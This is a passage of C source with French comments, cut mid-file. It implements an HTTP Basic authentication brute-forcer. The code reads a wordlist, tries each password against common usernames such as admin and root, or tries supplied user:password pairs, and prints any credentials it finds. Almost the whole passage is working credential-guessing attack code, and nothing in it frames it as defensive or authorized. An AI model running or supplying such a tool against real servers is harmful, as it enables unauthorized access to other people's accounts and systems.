        return;
    }

    char line[512];
    long tries = 0;

    /* Utilisateurs courants à tester */
    const char *common_users[] = {"admin","root","administrator","user","test",NULL};

    while (fgets(line, sizeof line, wf)) {
        line[strcspn(line, "\n\r")] = 0;
        if (!line[0] || line[0] == '#') continue;

        char *user = line;
        char *pass = strchr(line, ':');

        if (!pass) {
            /* Si pas de ':', on teste le mot comme password pour les users communs */
            for (int i = 0; common_users[i]; i++) {
                tries++;
                int r = http_basic_auth_try(host, port, path, common_users[i], line);
                if (r == 1) {
                    OK; printf(GRN "CREDENTIALS TROUVÉS: %s:%s\n" RST, common_users[i], line);
                    fclose(wf);
                    return;
                }
                printf(YEL "  [%ld] Essai %s:%s\r" RST, tries, common_users[i], line);
                fflush(stdout);
            }
        } else {
            *pass++ = '\0';
            tries++;
            int r = http_basic_auth_try(host, port, path, user, pass);
            if (r == 1) {
                OK; printf(GRN "CREDENTIALS TROUVÉS: %s:%s\n" RST, user, pass);
                fclose(wf);
                return;
            }
            printf(YEL "  [%ld] Essai %s:%s\r" RST, tries, user, pass);
            fflush(stdout);
        }
    }
    fclose(wf);
    printf("\n");
    WARN; printf("Aucun credential valide trouvé après %ld essais.\n", tries);
}

